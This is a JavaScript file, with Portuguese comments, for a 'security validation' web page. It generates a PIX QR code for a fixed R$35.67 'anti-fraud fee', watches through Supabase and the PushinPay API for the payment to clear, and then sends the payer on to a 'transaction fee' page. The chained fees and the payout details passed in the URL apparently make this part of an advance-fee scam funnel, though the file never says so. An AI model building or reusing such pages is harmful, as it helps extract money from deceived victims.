// JavaScript para página de Validação de Segurança

// Configuração Supabase (carregada de config.js)
const SUPABASE_URL = window.SUPABASE_CONFIG?.URL || '';
const SUPABASE_ANON_KEY = window.SUPABASE_CONFIG?.ANON_KEY || '';

// Verificar se config foi carregado
if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
}

// Inicializar Supabase
if (typeof window.validacaoSegurancaSupabase === 'undefined') {
    window.validacaoSegurancaSupabase = null;
}

const SECURITY_FEE = 35.67; // Taxa anti-fraude

// Formatar valor como moeda
function formatCurrency(value) {
    return value.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).replace('R$', 'R$ ');
}

// Obter parâmetros da URL
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        name: params.get('name') || 'Cliente',
        amount: parseFloat(params.get('amount')) || 0,
        pixKey: params.get('pixKey') || '',
        pixKeyType: params.get('pixKeyType') || 'E-mail'
    };
}

// Criar pagamento PIX via Supabase
async function createPixPayment(amount, payerName, pixKey, pixKeyType, supabaseClient = null) {
    try {
        const client = supabaseClient || window.validacaoSegurancaSupabase;
        if (!client) {
            throw new Error('Supabase não inicializado');
        }


        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                amount: amount,
                description: 'Taxa anti-fraude para validação de segurança',
                payerName: payerName,
                pixKey: pixKey,
                pixKeyType: pixKeyType
            }
        });

        if (error) {
            throw new Error(error.message || 'Erro ao criar pagamento');
        }

        if (!data || !data.success) {
            throw new Error(data?.error || 'Erro ao gerar QR Code PIX');
        }

        return data;
    } catch (error) {
        throw error;
    }
}

// Consultar status do PIX na PushinPay
async function checkPixStatus(paymentId, supabaseClient = null) {
    try {
        const client = supabaseClient || window.validacaoSegurancaSupabase;
        if (!client) {
            return null;
        }


        const { data, error } = await client.functions.invoke('bright-api', {
            body: {
                action: 'check_status',
                paymentId: paymentId
            }
        });

        if (error) {
            return null;
        }

        if (data) {
        } else {
        }

        return data;
    } catch (error) {
        return null;
    }
}

// Monitorar confirmação de pagamento
function monitorPaymentConfirmation(paymentId, onConfirmed, supabaseClient = null) {
    const client = supabaseClient || window.validacaoSegurancaSupabase;
    if (!client) {
        return;
    }


    let isConfirmed = false;

    // Realtime subscription (banco de dados)
    // Realtime subscription - Escutar UPDATEs (quando status muda de pending para confirmed)
    const channel = client.channel(`payment-${paymentId}`)
        .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'payment_confirmations',
            filter: `payment_id=eq.${paymentId}`
        }, (payload) => {
            const confirmation = payload.new;
            // IMPORTANTE: Só confirmar se o status for 'confirmed' ou 'paid'
            if (confirmation.payment_id === paymentId &&
                (confirmation.status === 'confirmed' || confirmation.status === 'paid') &&
                !isConfirmed) {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);
                onConfirmed(confirmation);
            } else {
            }
        })
        .subscribe(() => {
        });

    // Polling no banco de dados (backup)
    const dbPollInterval = setInterval(async () => {
        if (isConfirmed) {
            clearInterval(dbPollInterval);
            return;
        }

        try {
            const { data, error } = await client
                .from('payment_confirmations')
                .select('*')
                .eq('payment_id', paymentId)
                .maybeSingle();

            if (data && !error && !isConfirmed) {
                // IMPORTANTE: Só confirmar se o status for 'confirmed' ou 'paid'
                if (data.status === 'confirmed' || data.status === 'paid') {
                    isConfirmed = true;
                    clearInterval(dbPollInterval);
                    clearInterval(pushinpayPollInterval);
                    client.removeChannel(channel);
                    onConfirmed(data);
                } else {
                }
            }
        } catch (error) {
        }
    }, 2000);

    // Verificação imediata ao iniciar
    (async () => {
        try {
            const statusData = await checkPixStatus(paymentId, client);
            if (statusData && statusData.status === 'paid' && !isConfirmed) {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);

                const confirmation = {
                    payment_id: paymentId,
                    status: 'confirmed',
                    amount: statusData.value ? parseFloat(statusData.value) / 100 : null,
                    gateway: 'pushinpay'
                };

                onConfirmed(confirmation);
            }
        } catch (error) {
        }
    })();

    // Polling direto na API PushinPay (a cada 5 segundos)
    const pushinpayPollInterval = setInterval(async () => {
        if (isConfirmed) {
            clearInterval(pushinpayPollInterval);
            return;
        }

        try {
            const statusData = await checkPixStatus(paymentId, client);

            if (statusData && statusData.status === 'paid') {
                isConfirmed = true;
                clearInterval(dbPollInterval);
                clearInterval(pushinpayPollInterval);
                client.removeChannel(channel);

                const confirmation = {
                    payment_id: paymentId,
                    status: 'confirmed',
                    amount: statusData.value ? parseFloat(statusData.value) / 100 : null,
                    gateway: 'pushinpay'
                };

                onConfirmed(confirmation);
            } else if (statusData) {
            } else {
            }
        } catch (error) {
        }
    }, 5000); // 5 segundos

    return () => {
        clearInterval(dbPollInterval);
        clearInterval(pushinpayPollInterval);
        client.removeChannel(channel);
    };
}

// Variável para armazenar o código PIX atual
let currentPixCode = '';

// Mostrar estado de loading no modal
function showPixLoading() {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');

    if (!modal) return;

    // Esconder outros estados
    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    // Mostrar loading
    if (loadingState) loadingState.classList.remove('hidden');

    // Mostrar modal
    modal.classList.remove('hidden');
}

// Mostrar estado de erro no modal
function showPixError(errorMessage) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');
    const errorMsgEl = document.getElementById('errorMessage');

    if (!modal) return;

    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    // Mostrar erro
    if (errorState) errorState.classList.remove('hidden');
    if (errorMsgEl) errorMsgEl.textContent = errorMessage || 'Ocorreu um erro ao gerar o QR Code PIX.';

    // Modal já está visível
}

// Mostrar modal com QR Code PIX (estado de sucesso)
function showPixModal(paymentData, amount) {
    const modal = document.getElementById('pixModal');
    const qrCodeImage = document.getElementById('qrCodeImage');
    const pixCode = document.getElementById('pixCode');
    const modalAmount = document.getElementById('modalAmount');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');

    if (!modal || !qrCodeImage || !pixCode) {
        return;
    }

    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (confirmedState) confirmedState.classList.add('hidden');

    // Mostrar sucesso
    if (successState) successState.classList.remove('hidden');

    // Preencher dados
    if (paymentData.qrCode) {
        qrCodeImage.src = paymentData.qrCode;
    }
    if (paymentData.copyPaste) {
        currentPixCode = paymentData.copyPaste;
        pixCode.textContent = currentPixCode;
    }
    if (modalAmount) {
        modalAmount.textContent = formatCurrency(amount);
    }

    // Modal já está visível
}

// Mostrar estado de Pagamento Confirmado
function showPixConfirmed(onSuccessCallback) {
    const modal = document.getElementById('pixModal');
    const loadingState = document.getElementById('pixLoadingState');
    const errorState = document.getElementById('pixErrorState');
    const successState = document.getElementById('pixSuccessState');
    const confirmedState = document.getElementById('pixConfirmedState');
    const confirmedTitle = document.getElementById('confirmedTitle');
    const confirmedSubtitle = document.getElementById('confirmedSubtitle');
    const confirmedSpinner = document.getElementById('confirmedSpinner');

    if (!modal || !confirmedState) {
        return;
    }


    // Esconder outros estados
    if (loadingState) loadingState.classList.add('hidden');
    if (errorState) errorState.classList.add('hidden');
    if (successState) successState.classList.add('hidden');

    // Mostrar estado de confirmação
    confirmedState.classList.remove('hidden');

    // Resetar animações
    if (confirmedTitle) {
        confirmedTitle.style.opacity = '0';
        confirmedTitle.style.transform = 'translateY(10px)';
    }
    if (confirmedSubtitle) {
        confirmedSubtitle.style.opacity = '0';
    }
    if (confirmedSpinner) {
        confirmedSpinner.style.opacity = '0';
    }

    // Animar título (delay 0.3s)
    setTimeout(() => {
        if (confirmedTitle) {
            confirmedTitle.style.transition = 'opacity 0.5s ease-out, transform 0.5s ease-out';
            confirmedTitle.style.opacity = '1';
            confirmedTitle.style.transform = 'translateY(0)';
        }
    }, 300);

    // Animar subtítulo (delay 0.5s)
    setTimeout(() => {
        if (confirmedSubtitle) {
            confirmedSubtitle.style.transition = 'opacity 0.5s ease-out';
            confirmedSubtitle.style.opacity = '1';
        }
    }, 500);

    // Animar spinner (delay 0.7s)
    setTimeout(() => {
        if (confirmedSpinner) {
            confirmedSpinner.style.transition = 'opacity 0.5s ease-out';
            confirmedSpinner.style.opacity = '1';
        }
    }, 700);

    // Executar callback após 1.5 segundos
    setTimeout(() => {
        if (onSuccessCallback) {
            onSuccessCallback();
        }
    }, 1500);
}

// Inicializar eventos do modal
function initPixModalEvents() {
    const modal = document.getElementById('pixModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const copyPixBtn = document.getElementById('copyPixBtn');

    if (!modal) return;

    // Fechar modal ao clicar no X
    if (closeModalBtn) {
        closeModalBtn.onclick = () => {
            modal.classList.add('hidden');
        };
    }

    // Fechar modal ao clicar fora
    modal.onclick = (e) => {
        if (e.target === modal) {
            modal.classList.add('hidden');
        }
    };

    // Copiar código PIX
    if (copyPixBtn) {
        copyPixBtn.onclick = async () => {
            if (!currentPixCode) return;

            try {
                await navigator.clipboard.writeText(currentPixCode);

                // Feedback visual
                const originalHTML = copyPixBtn.innerHTML;
                copyPixBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check w-4 h-4">
                        <path d="M20 6 9 17l-5-5"></path>
                    </svg>
                `;
                copyPixBtn.classList.add('bg-emerald-500', 'hover:bg-emerald-600');
                copyPixBtn.classList.remove('bg-[#E94560]', 'hover:bg-[#d63d56]');

                setTimeout(() => {
                    copyPixBtn.innerHTML = originalHTML;
                    copyPixBtn.classList.remove('bg-emerald-500', 'hover:bg-emerald-600');
                    copyPixBtn.classList.add('bg-[#E94560]', 'hover:bg-[#d63d56]');
                }, 2000);
            } catch (error) {
                alert('Erro ao copiar código. Tente selecionar e copiar manualmente.');
            }
        };
    }
}

// Inicializar Supabase quando disponível
function initSupabase() {
    if (window.supabase && !window.validacaoSegurancaSupabase) {
        try {
            window.validacaoSegurancaSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
                auth: {
                    storage: localStorage,
                    persistSession: true,
                    autoRefreshToken: true
                }
            });
        } catch (error) {
        }
    }
    return window.validacaoSegurancaSupabase;
}

// Inicializar ao carregar
window.addEventListener('load', () => {
    // Inicializar Supabase
    initSupabase();
    if (!supabase && window.supabase) {
        initSupabase();
    }

    // Inicializar eventos do modal PIX
    initPixModalEvents();

    const params = getUrlParams();

    // Atualizar valores da taxa
    const feeDisplays = document.querySelectorAll('.security-fee-display');
    feeDisplays.forEach(el => {
        el.textContent = formatCurrency(SECURITY_FEE);
    });

    // Função para processar pagamento PIX
    async function processPixPayment() {
        try {
            // Mostrar loading
            showPixLoading();

            // Garantir que Supabase está inicializado
            const supabaseClient = initSupabase();
            if (!supabaseClient) {
                throw new Error('Supabase não inicializado');
            }

            // Criar pagamento PIX
            const paymentData = await createPixPayment(SECURITY_FEE, params.name, params.pixKey, params.pixKeyType, supabaseClient);

            if (paymentData && paymentData.paymentId) {
                // Monitorar confirmação
                monitorPaymentConfirmation(paymentData.paymentId, (confirmation) => {
                    // Mostrar tela de "Pagamento Confirmado" e redirecionar
                    showPixConfirmed(() => {
                        const nextUrl = `taxa-transacional.html?name=${encodeURIComponent(params.name)}&pixKey=${encodeURIComponent(params.pixKey)}&pixKeyType=${encodeURIComponent(params.pixKeyType)}`;
                        window.location.href = nextUrl;
                    });
                }, supabaseClient);

                // Mostrar modal com QR Code (sucesso)
                showPixModal(paymentData, SECURITY_FEE);
            } else {
                throw new Error('Resposta inválida da API');
            }
        } catch (error) {
            showPixError(error.message || 'Erro ao processar pagamento. Tente novamente.');
        }
    }

    // Botão pagar taxa de segurança
    const paySecurityBtn = document.getElementById('paySecurityBtn');
    if (paySecurityBtn) {
        paySecurityBtn.addEventListener('click', processPixPayment);
    }

    // Botão tentar novamente (retry)
    const retryPixBtn = document.getElementById('retryPixBtn');
    if (retryPixBtn) {
        retryPixBtn.addEventListener('click', processPixPayment);
    }
});

